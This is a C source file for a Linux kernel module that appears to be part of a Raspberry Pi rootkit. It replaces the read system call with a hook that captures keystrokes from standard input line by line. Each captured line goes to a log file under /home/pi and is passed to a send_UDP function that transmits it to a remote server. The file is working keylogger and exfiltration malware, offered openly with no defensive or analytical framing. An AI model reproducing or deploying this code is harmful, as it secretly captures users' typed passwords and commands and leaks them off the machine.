#include<linux/slab.h>		// for kmalloc
#include <linux/uaccess.h> 	// for copy_from_user
#include <linux/unistd.h>	// for __NR_getdents64 & __NR_getdents
#include <linux/delay.h>	// for msleep
#include <linux/string.h>	
#include <linux/fs.h> 		// for flip_open	
#include <linux/cred.h>		// for get_current_user()
#include <linux/types.h>
#include <linux/sched.h>
//#include <linux/uidgid.h>

#include "hack_pi.h"		// includes enable/disable, etc. functions
#include "read_hooking.h"
#include "send_UDP.h"
//#include "file_hiding.h"

#define FILES_VISIBLE 0
#define FILES_HIDDEN 1

bool IS_COMMAND = false;

// Function pointers to original syscalls
asmlinkage ssize_t (*original_read)(int fd, char *buf, size_t count);

asmlinkage ssize_t hacked_read(int fd, char *buf, size_t count)
{
	int ret = original_read(fd, buf, count);	// call original sys_read
	static unsigned char logger_buffer[255];
	char *filename = "/home/pi/rootkit_logfile";
	struct file *file;
	mm_segment_t old_fs;
	loff_t pos = 0;
	static int i=0;

	// logs the buffer when fd is 0 and byte size is 1
	if(fd==0 && count==1)
	{
		//snprintf(copied_buffer, 2, copied_buffer);
		//strcat(logger_buffer, buf);

		if(buf[0]!='\r' && buf[0] != '\n'){
			printk("i is %d...\n", i); 
			logger_buffer[i] = buf[0];
			printk("Buffer is %c... \n", logger_buffer[i]);
			i++;
		}
			
		if((buf[0]=='\r' || buf[0] == '\n'))
		{
			logger_buffer[i] = '\n';
			//printk("Enter is pressed... \n");
			//IS_COMMAND = true;
			printk("Buffer is %s... \n", logger_buffer);
			i=0;

			// set addr limit of current process to that of kernel			
			old_fs = get_fs();
			set_fs(KERNEL_DS);

			file = filp_open(filename, O_RDWR|O_APPEND|O_CREAT, 0644);
	
			if(IS_ERR(file)){
				printk("CREATE FILE ERROR...\n");
			}
			else{
				if(file && ret>0){
					pos=0;
					printk("Copying from user...%s\n\n", logger_buffer);	
					vfs_write(file, logger_buffer, strlen(logger_buffer), &pos);	
					send_UDP(logger_buffer);	// send logged data to server								
					filp_close(file, NULL);
				}else{
					if(!file)
						printk("File open error...\n");
					else if(ret<=0)
						printk("Sys_read error...\n");
				}
			memset(logger_buffer, 0, sizeof(logger_buffer));
			}
			// set addr limit of current process back to its own
			set_fs(old_fs);

		} 	// end if
	} 		// end if
	return ret;
}

void enable_read_hooking(void)
{
	printk("Enable read hooking...");
	// Hook system calls to our function
	HOOK_SYSCALL(read);

}

void disable_read_hooking(void)
{
	RESTORE_SYSCALL(read);
}

void init_read_hooking(void)
{
	printk("Init read hooking...");	
	enable_read_hooking();
}

void finalize_read_hooking(void)
{
	disable_read_hooking();
}
